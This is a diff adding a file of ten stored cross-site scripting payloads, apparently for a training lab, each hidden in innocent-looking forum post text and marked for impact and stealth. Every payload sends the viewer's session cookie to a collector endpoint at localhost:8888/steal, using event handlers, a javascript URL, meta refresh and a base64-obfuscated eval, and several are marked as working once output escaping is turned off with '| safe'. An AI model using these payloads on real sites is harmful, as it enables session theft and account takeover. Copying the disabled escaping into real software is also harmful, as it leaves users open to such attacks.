@@ -1,0 +1,97 @@
+// WARNING: These are MALICIOUS scripts for educational purposes only!
+
+
+// ============================================================
+// PAYLOAD 1: Basic Image Tag with onerror
+// ============================================================
+// Scenario: Post looks like a normal message with emoji
+// Impact: HIGH - Executes immediately when page loads
+// Stealth: VERY HIGH - invisible
+// STATUS: WORKS (after adding | safe to template)
+
+Great post! <img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)" style="display:none">
+
+// ============================================================
+// PAYLOAD 2: Link with onmouseover
+// ============================================================
+// Scenario: "Helpful" link to an article
+// Impact: HIGH - Activates even on mouse hover
+// Stealth: HIGH - Looks like a normal link
+// STATUS: WORKS (requires mouse hover)
+
+I recommend this security article: <a href="#" onmouseover="new Image().src='http://localhost:8888/steal?cookie='+document.cookie">Click here</a>
+
+// ============================================================
+// PAYLOAD 3: SVG with onload
+// ============================================================
+// Scenario: Adding an "icon" to the post
+// Impact: HIGH - SVG onload executes automatically
+// Stealth: VERY HIGH - blank post with SVG looks innocent
+// STATUS: WORKS (immediate, very effective)
+
+<svg/onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)"></svg>
+
+// ============================================================
+// PAYLOAD 4: Script Tag with Base64 Obfuscation
+// ============================================================
+// Scenario: "System test" - admins often publish such things
+// Impact: HIGH - eval() executes decoded code
+// Stealth: VERY HIGH - Base64 hides true intentions
+// Decoded: fetch('http://localhost:8888/steal?cookie='+document.cookie)
+// STATUS: WORKS (if CSP doesn't block)
+
+System test... <script>eval(atob('ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6ODg4OC9zdGVhbD9jb29raWU9Jytkb2N1bWVudC5jb29raWUp'))</script>
+
+// ============================================================
+// PAYLOAD 5: Iframe with JavaScript URL
+// ============================================================
+// Scenario: Embedding "video" or external content
+// Impact: MEDIUM - Requires iframe support by browser
+// Stealth: HIGH - Invisible iframe (display:none)
+
+Check out the latest tutorial: <iframe src="javascript:parent.location='http://localhost:8888/steal?cookie='+document.cookie" style="display:none"></iframe>
+
+// ============================================================
+// PAYLOAD 6: Body Tag with onload
+// ============================================================
+// Scenario: Welcome message
+// Impact: HIGH - Body onload executes on page load
+// Stealth: LOW - Body tag in post is suspicious
+
+Welcome! <body onload="new Image().src='http://localhost:8888/steal?c='+document.cookie"></body>
+
+// ============================================================
+// PAYLOAD 7: Details Tag with ontoggle
+// ============================================================
+// Scenario: "FAQ" with expandable content
+// Impact: HIGH - ontoggle activates automatically (open attribute)
+// Stealth: VERY HIGH - HTML5 tag rarely filtered
+
+FAQ: <details open ontoggle="fetch('http://localhost:8888/steal?cookie='+document.cookie)"><summary>Click to expand</summary>Content...</details>
+
+// ============================================================
+// PAYLOAD 8: Meta Refresh with JavaScript URL
+// ============================================================
+// Scenario: Page update warning
+// Impact: HIGH - Meta refresh executes automatically
+// Stealth: MEDIUM - May be detected by meta tag filters
+
+The page will be updated soon <meta http-equiv="refresh" content="0;url=javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">
+
+// ============================================================
+// PAYLOAD 9: Input with autofocus and onfocus
+// ============================================================
+// Scenario: Survey or feedback form
+// Impact: HIGH - autofocus triggers onfocus automatically
+// Stealth: HIGH - Looks like an interactive element
+
+Fill out the survey: <input autofocus onfocus="new Image().src='http://localhost:8888/steal?cookie='+document.cookie" placeholder="Your answer">
+
+// ============================================================
+// PAYLOAD 10: Video Tag with onerror
+// ============================================================
+// Scenario: Sharing "recording" from an event
+// Impact: HIGH - Video onerror executes when src fails to load
+// Stealth: HIGH - Media tags commonly used on forums
+
+Recording from the conference: <video src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)"></video>
